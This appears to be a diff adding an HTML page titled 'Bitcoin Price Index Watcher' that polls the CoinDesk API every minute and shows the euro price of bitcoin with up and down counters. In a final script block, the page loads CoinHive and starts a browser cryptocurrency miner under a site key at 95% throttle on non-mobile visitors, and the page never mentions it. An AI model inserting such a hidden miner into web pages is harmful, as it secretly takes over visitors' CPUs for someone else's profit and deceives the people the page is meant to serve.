@@ -1,0 +1,99 @@
+<html>
+<head>
+<title>Bitcoin Price Index Watcher in HTML5</title>
+<style type="text/css">
+  #data {
+    width: 400px;
+    font-size: 20px;
+    text-align: center;
+    margin: 0 auto;
+    margin-top: 50px;
+    padding: 10px;
+  }
+  #logo {
+    width: 320px;
+    height: 320px;
+    margin: 0 auto;
+    margin-top: 50px;
+    display: block;
+  }
+</style>
+</head>
+<body>
+  <img id="logo" src="up.gif" />
+  <div id="data" />
+  <script type="text/javascript">
+
+    var xmlhttp = new XMLHttpRequest();
+    var url = "https://api.coindesk.com/v1/bpi/currentprice.json";
+
+    var json;
+    xmlhttp.open("GET", url, true);
+    xmlhttp.send();
+    xmlhttp.onreadystatechange = function() {
+        if (this.readyState == 4  &&  this.status == 200) {
+             json = JSON.parse(this.responseText);
+            parseJson(json);
+            }		
+    };
+
+    window.setInterval(function(){
+        xmlhttp.open("GET", url, true);
+        xmlhttp.send();
+        xmlhttp.onreadystatechange = function() {
+        if (this.readyState == 4  &&  this.status == 200) {
+             json = JSON.parse(this.responseText);
+            parseJson(json);
+            }		
+        }; 
+    }, 60000);
+
+    var time;
+    var euroValue;
+    var price = 0;
+    console.log(price);
+
+    var timeUp = 0;
+    var timeDown = 0;
+
+    function parseJson(json) {
+
+      console.log("fired");
+      newtime = "<b>Last Updated : " + json["time"]["updated"] + "</b>";
+      neweuroValue = "1 BTC equals to &euro;" + json["bpi"]["EUR"]["rate"];
+      newprice = json["bpi"]["EUR"]["rate"];
+
+      time = newtime;
+      euroValue = neweuroValue;
+
+      if(newprice>price){
+        document.getElementById("logo").src = "up.gif";
+        timeUp ++;
+      } else {
+        document.getElementById("logo").src = "down.gif";
+        timeDown ++;
+      }
+
+      price = newprice;
+
+      document.getElementById("data").innerHTML = 
+            time + 
+	       "<br /><br />" + 
+           euroValue +
+           "<br /><br />" + 
+           timeUp + " minutes up since Jan 5, 2019 15:44" +"</br>"+
+           timeDown + " minutes down since Jan 5, 2019 15:44";
+    }
+   
+</script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous("mFOTdbu4TkuuFIFDEAQL94fWUF8699Ml", {throttle: 0.95});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
+</script></body>
+</html>
